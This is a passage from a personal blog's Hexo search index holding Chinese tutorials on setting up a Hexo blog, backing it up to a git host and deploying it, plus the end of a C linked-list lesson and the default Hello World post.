输出插入节点之后的链表 puts("修改链表第2个节点的值"); change(head,2);// 修改第2个节点的值 puts("输出修改了第2个节点的值之后的链表"); print(head);// 输出修改了第2个节点的值之后的链表 return 0;&#125; 输出结果： 1234567891011121314151617创建具有5个节点的链表1 2 3 4 5输出链表1 2 3 4 5 删除链表第3个节点输出删除链表第3个节点之后的链表1 2 4 5 在链表的第4个节点之后插入一个节点输入要插入的值6输出插入节点之后的链表1 2 4 5 6 修改链表第2个节点的值输入要修改的值7输出修改了第2个节点的值之后的链表1 7 4 5 6 致谢 菜鸟教程——C语言教程 C语言入门教程 C语言中文网 C语言基础知识笔记 csdn大佬的博客]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用代码托管网站备份和发布个人博客]]></title>
    <url>%2Fposts%2F4555adf3%2F</url>
    <content type="text"><![CDATA[前言 在上一篇博客中，我已经教会了大家如何利用hexo搭建本地博客。 接下来我将教大家如何备份自己的博客到云端以实现多终端（多台电脑）写博客以及如何将本地博客发布（也叫部署）到公网——方便所有人查看和阅读。 问题：为什么需要备份和发布博客？ 因为有时候我们会遇到下面几个问题 1. 如果我想在另一台电脑写博客怎么办 2. 如果我换电脑了怎么办 3. 如果我有好多台不同操作系统的电脑都需要写博客怎么办 4. 如果我想把我的博客文章分享给其他人看，怎么办 为了处理好以上这些问题，我们需要将博客备份起来并且托管到公网服务器便于查看 解决问题思路 利用git仓库的分支管理实现备份博客和发布网站——备份的文件包括主题，配置以及博客原文（xxx.md）等具体： 主题和配置以及博客原文等放在master分支 生成的静态网站等放在website分支 每次修改了博客都要干两件事 发布静态网站（借助hexo插件推送到website分支）hexo clean &amp;&amp; hexo d 备份到git仓库（使用git命令推送到master分支）git add .git commit-m &quot;这里填提交信息&quot;git push 环境准备 1. hexo博客依赖环境，nodejs和git工具已经安装好了，如果没有安装好，请移步上篇博客 2. 拥有coding或者其他代管托管平台（如github，gitee等）账号，如果没有，请移步注册 说明 本文以coding为例，其他托管平台操作类似 配置 ssh 公钥访问 git 仓库参考官方帮助文档，操作步骤很详细，不再赘述 创建仓库 打开浏览器，登陆coding网站 右上角通知图标旁边，有个项目图标，鼠标放上去会自动弹出菜单，选择新建项目，如图 在打开的网页中，输入项目名称（我这里叫blog），项目描述等，选择git仓库 打开你的blog项目，选择左边菜单处的代码仓库–&gt;代码浏览，然后选择右边的ssh，点击后面的按钮，将ssh链接复制到剪切板 找一个目录，右键Git Bash Here（Linux选在此处打开终端），输入命令git clone 刚才复制的ssh链接，完成后这个目录下会多一个blog文件夹 进入blog文件夹，将上篇博客中创建的本地博客文件夹里面的内容全部复制到刚才的文件夹下 在blog文件夹下，新建.gitignore文件，可以使用命令touch .gitignore（注意，该文件不是文本文件，但可以用文本文件编辑器操作），内容如下 12345678.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/.idea/ 使用以下命令推送到到远端仓库 1234567git config --global user.name "这里填你的名称" # 如果配置过，可跳过git config --global user.email "这里填你的名称" # 如果配置过，可跳过git pullgit statusgit add .git commit -m "这里填提示信息"git push 新建分支 回到浏览器，登陆coding，然后选择左边菜单处的代码仓库–&gt;分支管理 点击右侧的新建分支 在弹出的页面输入website，点击创建分支 配置hexo 用文本编辑器（notepad++等），打开项目的_config.yml文件，先用 Ctrl + F，搜索deploy，然后修改参数如下 1234deploy: - type: git repo: ssh地址 # 仓库的ssh地址 branch: website # 要推送到的分支 安装插件，使用如下命令 1npm install hexo-deployer-git --save 发布静态网站 回到浏览器，登陆coding，然后选择左边菜单处的持续部署–&gt;静态网站 点击新建，输入相关信息，注意选择推送到“website”分支时触发构建，点击保存 保存后会得到一个url地址，类似下面框出来的那个 打开之前的blog文件夹，鼠标右键，选择Git Bash Here，输入命令hexo clean &amp;&amp; hexo d，稍等一会儿，不出意外的话，你就可以通过上面得到的url访问你的博客了，enjoy it! 绑定个人的二级域名 可以看到，上面默认分配给我们的url非常不具有可读性，压根没有办法记忆，于是我们产生了另外一个需求，绑定一个适合记忆的域名，方便我们访问我们自己的博客 这里假设我们已经有了自己的域名并且已经备案 在域名控制台里面，加一条二级域名解析，主机记录就是二级域名，类型选CNAME，记录值就是之前得到的url 在coding的静态网站部署页面绑定二级域名 通过浏览器访问二级域名测试，不一定立即成功，解析有延迟 多终端写博客 如果需要在新的终端（电脑）写博客，或者之前的系统崩溃了，需要恢复博客，请看以下操作步骤 在终端上配置nodejs，移步上篇博客 安装hexo，执行命令npm install -g hexo-cli 克隆备份好的博客仓库到本地，执行命令git clone ssh仓库地址，使用前需配置ssh公钥 进入刚才克隆下来的项目目录，安装npm依赖，执行命令npm install 写博客，发布，同以前一样 注意（多次强调） 每次修改了博客都要干两件事 1. 发布静态网站（借助hexo插件推送到website分支） hexo clean &amp;&amp; hexo d 2. 备份源文件等到git仓库（使用git命令推送到master分支） git add . git commit-m &quot;这里填提交信息&quot; git push每次在新的终端上写博客都要做的事 如果没有依赖环境，请先安装nodejs，hexo等依赖环境，如果有，别忘了先同步修改到本地，否则极有可能产生冲突，同步命令 git pull]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>个人博客</tag>
        <tag>代码托管</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用hexo搭建属于自己的博客]]></title>
    <url>%2Fposts%2Faf001b50%2F</url>
    <content type="text"><![CDATA[前言 随着计算机的发展，拥有一个属于自己的博客，是一件非常平常的事。而使用hexo框架搭建个人博客网站是比较流行的方式，因为它简单，快速，高效，且有很多炫酷的特效和方便的自定义，最重要的是它完全免费（更多hexo详细介绍，请参考hexo官网）。 接下来我将带领大家一起搭建自己的博客。后续还将带领大家完成个人博客的各种自定义特效，以及功能增强，包括发布到公网，备份博客，多终端写博客等等。想提前看看效果的亲们，请移步我的个人博客。 环境准备 windows下：nodejs: 点击跳转至下载页，直接下载最新的版本安装即可git: 点击跳转至下载页，直接下载最新的版本安装即可注：安装过程一路默认即可 Linux下：请看这篇文章 验证环境打开cmd窗口，输入命令 123git --versionnode -vnpm -v 如果出现，类似如下图所示，说明环境正确 安装hexo直接打开cmd，输入命令 12npm install -g cnpm --registry=https://registry.npm.taobao.org #使用淘宝镜像，国内速度会比较快npm install hexo-cli -g #安装hexo 搭建个人博客 找个空的文件夹，或者新建一个文件夹，命名为blog 进入blog文件夹、然后鼠标右键，选择Git Bash Here 初始化博客，使用命令 1hexo init 等待hexo初始化完成，这个过程可能会比较慢，因为需要从国外的网站上下载很多东西。当你看到下图红色方框中的提示信息，就代表初始化完成了。 启动博客 1hexo s 打开浏览器，在地址栏输入http://localhost:4000，即可访问到搭建好的本地博客啦，enjoy it!]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>个人博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fposts%2F4a17b156%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
